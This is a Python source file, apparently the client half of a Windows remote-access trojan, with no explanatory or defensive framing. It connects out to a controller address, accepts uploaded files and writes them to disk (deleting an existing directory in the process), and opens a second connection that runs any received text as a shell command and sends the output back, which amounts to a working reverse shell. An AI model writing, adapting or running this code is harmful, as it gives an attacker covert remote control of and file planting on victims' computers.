# -*- coding:utf-8 -*-
# @FileName  :test.py
# @Time      :2022/11/08 18:14:12
# @Author    :D0WE1L1N
import os
import socket
import subprocess
import sys
import shutil
import win32api
import win32con
import win32gui
import win32ui
def PINGPONG_client(ip, port):
    try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
        except socket.error as msg:
            sys.exit(1)
        while True:
            data = s.recv(1024)
            if data.decode() == "CMDSHELL_APP":
                s.send(bytes("OK", 'utf8'))
                cmd_port = int(s.recv(1024).decode(encoding="utf8"))
                s.close()
                CMD_client(ip, cmd_port, port)
                break
            if data.decode() == "EXIT_APP":
                s.close()
                break
            if data.decode() == "CHECK_APP":
                s.send(bytes("OK", "utf8"))
            if data.decode() == "UPLOAD_APP":
                is_named = False
                s.send(bytes("OK", 'utf8'))
                dir_data = s.recv(1024).decode()
                if "." in dir_data:
                    dir_data_l = dir_data.split(".")
                    is_named = dir_data_l[len(dir_data_l) - 1]
                while True:
                    if not is_named:
                        name_data = s.recv(1024).decode()
                    else:
                        name_data = s.recv(1024).decode()
                        name_data = is_named
                    if name_data == "END":
                        break
                    s.send(bytes("OK", "UTF8"))
                    len_data = s.recv(1024).decode()
                    s.send(bytes("OK", "UTF8"))
                    upload_data = s.recv(int(len_data))
                    if upload_data:
                        s.send(bytes(ip + ">" + "Sending", "utf8"))
                        if os.path.exists(dir_data + "/" + name_data):
                            shutil.rmtree(dir_data)
                        if not os.path.exists(dir_data):
                            os.mkdir(dir_data)
                        f = open(dir_data + "/" + name_data[:-4], "wb+")
                        f.write(upload_data)
                        f.close()
                        # os.rename(dir_data + "/" + name_data, name_data[:-4])
                        s.send(bytes("DONE", "utf8"))
                    else:
                        break
            if data == "exit":
                break
        s.close()
    except:
        sys.exit(1)


def CMD_client(ip, port, main_port):
    try:
        try:
            cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cmd_c.connect((ip, port))
        except socket.error as msg:
            sys.exit(1)
        while True:
            cmd_command = cmd_c.recv(1024)
            if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
                main_port = cmd_c.recv(1024).decode("utf8")
                PINGPONG_client(ip, int(main_port))
                break
            elif cmd_command.decode("utf8") == "PING":
                cmd_c.send(bytes("PONG", "utf8"))
            else:
                cmd = subprocess.Popen(cmd_command.decode(
                    "utf8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                cmd_print_out = cmd.stdout.read()
                if not cmd_print_out:
                    cmd_print_out = cmd.stderr.read()
                cmd_c.send(cmd_print_out)
        cmd_c.close()
    except:
        sys.exit(1)